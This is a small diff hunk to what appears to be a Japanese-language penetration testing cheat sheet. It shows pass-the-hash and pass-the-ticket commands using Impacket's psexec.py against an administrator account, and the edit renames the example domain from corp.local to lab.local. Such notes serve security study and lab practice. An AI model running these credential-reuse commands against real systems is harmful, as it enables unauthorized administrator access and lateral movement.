@@ -31,7 +31,7 @@ psexec.py -hashes :<NT_hash> administrator@<TARGET_IP>
 
 # Pass-the-Ticket（Linux）
 export KRB5CCNAME=ticket.ccache
-psexec.py -k -no-pass corp.local/administrator@target.corp.local
+psexec.py -k -no-pass lab.local/administrator@target.lab.local
 ```
 
 ## 注意点
